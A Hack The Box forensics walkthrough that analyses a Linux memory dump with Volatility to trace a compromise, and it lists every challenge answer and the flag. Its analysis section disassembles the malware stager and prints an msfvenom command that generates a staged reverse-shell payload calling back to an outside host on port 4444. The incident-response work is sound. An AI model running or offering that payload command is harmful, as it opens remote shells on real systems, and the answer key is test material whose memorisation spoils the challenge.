# Leaked — HTB Forensics Walkthrough

**Category:** Forensics
**Challenge type:** Linux memory forensics
**Tooling:** Volatility 2.6.1, `last`, `objdump`, `file`, `md5sum`
**Flag:** `HTB{wh0_l34k3d_th3_cr3ds!!!!?}`

---

## Challenge brief

> Our security team has been notified that the credentials of our Linux server have been found in a public data breach forum. After a quick investigation, it is clear that the server has been compromised. Luckily we managed to take a snapshot of the system's memory before shutting it down and isolating it. Try to analyze it and spot the malware. To get the flag, answer the questions from the docker instance successfully.

You're given a zip with two artifacts:

- `memory.dmp` — ~1 GB Linux memory dump
- `Ubuntu_4.15.0-184-generic_profile.zip` — Volatility 2 profile (DWARF + System.map)

A docker instance asks six questions. Get them all right, get the flag.

---

## TL;DR — answers

| # | Question | Answer |
|---|---|---|
| Q1 | Username + login date/time (UTC) | `developer 2022-12-08 15:21` |
| Q2 | IP of `enp0s3` interface | `192.168.1.5` |
| Q3 | PID of the suspicious process | `1521` |
| Q4 | Time the malware was executed (UTC) | `15:22:03` |
| Q5 | C2 IP:PORT | `77.74.198.52:4444` |
| Q6 | MD5 of the malware | `853bcc7d0867474ce3ab28ecb9756276` |

---

## 1. Setup

The provided `.zip` is a **Volatility 2** profile (Vol3 uses ISF JSON symbol files), so you need Vol2 + Python 2.7. On Kali (which ships Python 3 only by default these days):

```bash
# Install Python 2.7 + pip
sudo apt update
sudo apt install -y python2.7 python2.7-dev build-essential libssl-dev
curl -sSL https://bootstrap.pypa.io/pip/2.7/get-pip.py | sudo python2.7

# Volatility 2 dependencies
sudo pip2.7 install distorm3==3.4.4 pycrypto yara-python==3.11.0

# Get Volatility 2.6.1
wget https://github.com/volatilityfoundation/volatility/archive/refs/tags/2.6.1.tar.gz
tar xzf 2.6.1.tar.gz
cd volatility-2.6.1

# Drop the profile into the Linux profile folder
cp ~/Desktop/2026_Maryland_HTB_CTF/Forensics/Leaked/Ubuntu_4.15.0-184-generic_profile.zip \
   volatility/plugins/overlays/linux/

# Confirm the profile is recognized
python2.7 vol.py --info | grep -i ubuntu
# -> LinuxUbuntu_4_15_0-184-generic_profilex64
```

For convenience, set:

```bash
export VOL="python2.7 vol.py -f ~/Desktop/2026_Maryland_HTB_CTF/Forensics/Leaked/memory.dmp \
            --profile=LinuxUbuntu_4_15_0-184-generic_profilex64"
```

Sanity check that the profile binds correctly:

```bash
$VOL linux_banner
# Linux version 4.15.0-184-generic ... (Ubuntu 4.15.0-184.194-generic 4.15.18)
```

---

## 2. Investigation

### 2a. Who logged in, and when? (Q1, Q2)

Start with the obvious: who is on the box, from where, and what does the network look like.

```bash
$VOL linux_ifconfig
```

```
Interface        IP Address           MAC Address
---------------- -------------------- ------------------
lo               127.0.0.1            00:00:00:00:00:00
enp0s3           192.168.1.5          08:00:27:3f:7a:8c
```

→ **Q2: `192.168.1.5`**. The MAC `08:00:27:…` is VirtualBox-issued — a VM, as expected.

For the login itself, two corroborating sources:

```bash
$VOL linux_pslist | grep sshd
```

```
sshd   964    1     0     0      2022-12-08 15:20:59 UTC   # daemon
sshd   1161   964   0     0      2022-12-08 15:21:23 UTC   # priv-sep child (auth)
sshd   1439   1161  1000  1000   2022-12-08 15:21:34 UTC   # session as UID 1000
bash   1440   1439  1000  1000   2022-12-08 15:21:34 UTC   # user shell
```

The forked child running as UID 1000 starts at 15:21:34 — that's the post-auth user shell handoff. To get the *initial* login timestamp we recover `wtmp` from the kernel page cache:

```bash
$VOL linux_find_file -F /var/log/wtmp
# -> inode 0xffff96f7347ba770

$VOL linux_find_file -i 0xffff96f7347ba770 -O wtmp
last -f wtmp -F
```

```
develope pts/0  192.168.1.30  Thu Dec  8 15:21:08 2022  gone - no logout
develope tty1                 Thu Dec  8 15:21:00 2022 - Thu Dec  8 15:21:05 2022
reboot   system boot 4.15.0-184-gener  Thu Dec  8 15:20:20 2022  still running
```

→ **Q1: `developer 2022-12-08 15:21`**. The attacker SSH'd in from `192.168.1.30` at 15:21:08 UTC. (`last` truncates the username display to 8 chars; the actual user is `developer`, confirmed by UID 1000 in `linux_psaux`.)

### 2b. Spot the suspicious process (Q3)

Process listing first:

```bash
$VOL linux_pslist
```

Walk through the children of `bash` (PID 1440):

```
bash         1440  1439  1000  1000  2022-12-08 15:21:34 UTC
jN8ziHXGE    1521  1440  1000  1000  2022-12-08 15:22:29 UTC
```

A process with a randomly-mashed name in user-writable territory is exactly what you're looking for in this kind of challenge. Confirm with `linux_psaux`:

```
1521 1000 1000 ./jN8ziHXGE
```

→ **Q3: `1521`**.

Sanity-check the kernel for hidden modules — nothing suspicious there:

```bash
$VOL linux_check_modules
# (no output — no rootkit-style module hiding)
```

### 2c. When was it executed? (Q4)

Two candidate sources:

```bash
$VOL linux_bash
```

```
1440  bash  2022-12-08 15:22:03 UTC  ./jN8ziHXGE
```

```bash
$VOL linux_pslist | grep jN8ziHXGE
# 1521 ... 2022-12-08 15:22:29 UTC
```

The challenge accepts the **bash-history timestamp** (when the command was entered):

→ **Q4: `15:22:03`**.

(The 26-second gap to `task_struct` start time is normal — bash records the command at line entry, then forks/execs.)

### 2d. Where is it calling home? (Q5)

```bash
$VOL linux_netstat | grep ESTABLISHED
```

```
TCP  192.168.1.5:22     192.168.1.30:57274  ESTABLISHED  sshd/1161
TCP  192.168.1.5:22     192.168.1.30:57274  ESTABLISHED  sshd/1439
TCP  192.168.1.5:39112  77.74.198.52:4444   ESTABLISHED  jN8ziHXGE/1521
```

Top two are the attacker's SSH session. The third is the malware reaching out:

→ **Q5: `77.74.198.52:4444`**.

### 2e. MD5 the binary (Q6)

You have two choices: dump the in-memory image of the process, or pull the file from the kernel's page cache. The page cache version is the canonical on-disk artifact, so use that:

```bash
$VOL linux_find_file -F /home/developer/jN8ziHXGE
# -> inode 0xffff96f73c532328

$VOL linux_find_file -i 0xffff96f73c532328 -O jN8ziHXGE

file jN8ziHXGE
# ELF 64-bit LSB executable, x86-64, statically linked, no section header

stat -c%s jN8ziHXGE
# 250

md5sum jN8ziHXGE
# 853bcc7d0867474ce3ab28ecb9756276
```

→ **Q6: `853bcc7d0867474ce3ab28ecb9756276`**.

---

## 3. Bonus — what is this thing actually?

A 250-byte statically-linked ELF with no section headers is shellcode wrapped in a minimal ELF header. Disassembling the code segment confirms it byte-for-byte against the Metasploit reference:

```
xor    rdi, rdi
push   0x9            ; SYS_mmap
pop    rax
cdq                   ; rdx = 0
mov    dh, 0x10       ; rdx = 0x1000 (size)
mov    rsi, rdx
xor    r9, r9
push   0x22           ; MAP_PRIVATE | MAP_ANONYMOUS
pop    r10
mov    dl, 0x7        ; PROT_READ|WRITE|EXEC  -> RWX!
syscall

; ... socket(AF_INET, SOCK_STREAM, 0) ...
; ... connect(fd, {AF_INET, port=0x115c, addr=0x4d4ac634}, 16) ...
;        port  0x115c  = 4444
;        addr  0x4d4ac634 little-endian = 0x34.0xc6.0x4a.0x4d = 52.198.74.77 -> 77.74.198.52
; ... retry up to 10 times via nanosleep on connect failure ...
; ... read stage-2 into the mmap'd buffer ...
jmp    rsi            ; jump into stage 2
```

Identification: **`linux/x64/shell/reverse_tcp`** generated with something like:

```
msfvenom -p linux/x64/shell/reverse_tcp \
         LHOST=77.74.198.52 LPORT=4444 \
         -f elf -o jN8ziHXGE
```

This is a *staged* payload — the 250-byte binary is just the stager. After it connects, Metasploit on the attacker's box (77.74.198.52) sends the second-stage shell payload over the TCP socket, the stager `read()`s it into RWX memory, and `jmp`s in. That's why the attacker process tree shows nothing fancy — the real shell lives entirely in the mapped buffer at `0x7f0747806000` (visible in `linux_proc_maps`).

The RWX anonymous mapping at `0x7f0747806000` (4 KB, no file backing) is the dead giveaway in `proc_maps` if you ever need to spot this pattern without already knowing the process is malicious.

---

## 4. Lessons / takeaways

- **Page cache is gold.** `linux_find_file` lets you reach back into the on-disk world even if the file has since been deleted — it pulls cached inode contents straight out of memory.
- **Bash timestamps differ from `task_struct` start times.** The challenge wanted the former. Both are useful to capture in a real IR.
- **Random-looking process names + UID 1000 + child of bash + RWX anonymous mappings + outbound 4444** is a Metasploit reverse-shell tell-tale.
- **`wtmp` recovery** gives the cleanest answer for "when did the user log in" — sshd PID start time is a few seconds late (post-auth handoff).

---

## 5. Files in this folder

```
WALKTHROUGH.md                 ← this file
solve.sh                       ← reproducible end-to-end script
artifacts/
  01_banner.txt                ← linux_banner
  02_hostname.txt              ← linux_hostname (empty in this dump)
  03_ifconfig.txt              ← Q2 source
  04_pslist.txt                ← process list (Q3 source)
  05_pstree.txt                ← process tree
  06_psaux.txt                 ← command line + UIDs
  07_bash_history.txt          ← Q4 source
  08_netstat.txt               ← Q5 source
  09_proc_maps_1521.txt        ← memory map of malware (RWX mapping evidence)
  10_lsmod.txt                 ← kernel modules
  11_check_modules.txt         ← rootkit module-hiding check (clean)
  12_wtmp_lookup.txt           ← inode lookup for /var/log/wtmp
  13_wtmp_parsed.txt           ← Q1 source (last -f)
  14_malware_lookup.txt        ← inode lookup for the malware
  15_malware_hashes.txt        ← Q6 source (md5/sha1/sha256)
  wtmp                         ← recovered wtmp file
  jN8ziHXGE                    ← recovered malware binary (250 bytes)
```
